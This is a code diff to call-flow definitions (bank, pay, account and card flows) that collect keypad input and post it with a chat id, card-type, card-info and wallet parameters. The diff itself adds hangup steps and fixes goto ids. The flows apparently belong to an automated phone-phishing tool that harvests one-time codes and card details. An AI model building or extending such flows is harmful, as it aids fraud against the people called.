@@ -137,7 +137,10 @@ export const bankFlow = async (
           onKeypressVar: 'dtmf',
         },
         {
-          id: uuidv4(),
+          action: 'hangup',
+        },
+        {
+          id: 'bankStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}`,
@@ -196,7 +199,10 @@ export const bankFlow = async (
           onKeypressVar: 'dtmf',
         },
         {
-          id: uuidv4(),
+          action: 'hangup',
+        },
+        {
+          id: 'bankStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}`,
@@ -338,10 +344,17 @@ export const payFlow = async (
           onKeypressVar: 'dtmf',
         },
         {
-          id: uuidv4(),
+          action: 'hangup',
+        },
+        {
+          id: 'payStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet}`,
+            url: `${
+              process.env.ENDPOINT_URL
+            }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
+              ?.replace(/\s/g, '')
+              .toLowerCase()}`,
           },
         },
       ],
@@ -383,7 +396,7 @@ export const payFlow = async (
             voice: 'female',
             loop: true,
           },
-          onKeypressGoto: 'bankStepGoto',
+          onKeypressGoto: 'payStepGoto',
           onKeypressVar: 'dtmf',
         },
         {
@@ -392,14 +405,21 @@ export const payFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'bankStepGoto',
+          onKeypressGoto: 'payStepGoto',
           onKeypressVar: 'dtmf',
         },
         {
-          id: uuidv4(),
+          action: 'hangup',
+        },
+        {
+          id: 'payStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet}`,
+            url: `${
+              process.env.ENDPOINT_URL
+            }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
+              ?.replace(/\s/g, '')
+              .toLowerCase()}`,
           },
         },
       ],
@@ -538,10 +558,13 @@ export const accountFlow = async (
           onKeypressVar: 'dtmf',
         },
         {
-          id: uuidv4(),
+          action: 'hangup',
+        },
+        {
+          id: 'accountStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}`,
+            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
           },
         },
       ],
@@ -596,7 +619,10 @@ export const accountFlow = async (
           onKeypressVar: 'dtmf',
         },
         {
-          id: uuidv4(),
+          action: 'hangup',
+        },
+        {
+          id: 'accountStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
@@ -738,7 +764,10 @@ export const cardFlow = async (
           onKeypressVar: 'dtmf',
         },
         {
-          id: uuidv4(),
+          action: 'hangup',
+        },
+        {
+          id: 'cardStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
@@ -796,7 +825,10 @@ export const cardFlow = async (
           onKeypressVar: 'dtmf',
         },
         {
-          id: uuidv4(),
+          action: 'hangup',
+        },
+        {
+          id: 'cardStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
